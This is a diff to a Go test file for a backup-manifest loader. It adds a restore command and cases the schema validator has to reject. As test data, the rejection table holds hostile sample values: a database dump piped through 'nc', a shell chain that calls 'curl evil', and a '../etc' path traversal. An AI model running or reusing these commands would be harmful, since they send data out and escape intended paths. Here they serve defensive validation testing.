@@ -48,7 +48,8 @@ func TestTheLoaderReadsEveryFieldOfTheManifest(t *testing.T) {
 		Audience: catalog.Audience{Default: "adults", KidView: "Only the kids' albums"},
 		Data: []catalog.Data{
 			{What: "The library", Service: "web", Path: "/data"},
-			{What: "Its database", Service: "web", Dump: &catalog.Dump{Command: []string{"pg_dump", "--username=postgres", "everything"}, File: "everything.sql"}},
+			{What: "Its database", Service: "web", Dump: &catalog.Dump{Command: []string{"pg_dump", "--username=postgres", "everything"}, File: "everything.sql",
+				Restore: []string{"psql", "--username=postgres", "everything"}}},
 			{What: "Thumbnails", Service: "web", Path: "/cache", Backup: no(), Why: "They are made again from the library"},
 		},
 		Storage: []catalog.Storage{
@@ -173,6 +174,8 @@ func TestTheLoaderRefusesADefinitionOutsideTheSchema(t *testing.T) {
 		"a path that isn't plain":        {replace(everything, "service: web, path: /data}", "service: web, path: /data/../etc}"), "a plain absolute path"},
 		"a dump through a shell":         {replace(everything, "command: [pg_dump, --username=postgres, everything]", "command: [sh, -c, \"pg_dump | nc x 80\"]"), "plain arguments"},
 		"a dump's file out of its place": {replace(everything, "file: everything.sql", "file: ../everything.sql"), "plain name"},
+		"a dump with no way back":        {replace(everything, ", restore: [psql, --username=postgres, everything]", ""), "restore command"},
+		"a restore through a shell":      {replace(everything, "restore: [psql, --username=postgres, everything]", "restore: [sh, -c, \"psql; curl evil\"]"), "restore command"},
 		"data not backed up, no why":     {replace(everything, ", why: They are made again from the library", ""), "why"},
 		"storage with no id":             {replace(everything, "{id: library, ", "{"), "storage"},
 		"storage asked twice":            {replace(everything, "id: uploads", "id: library"), "storage"},
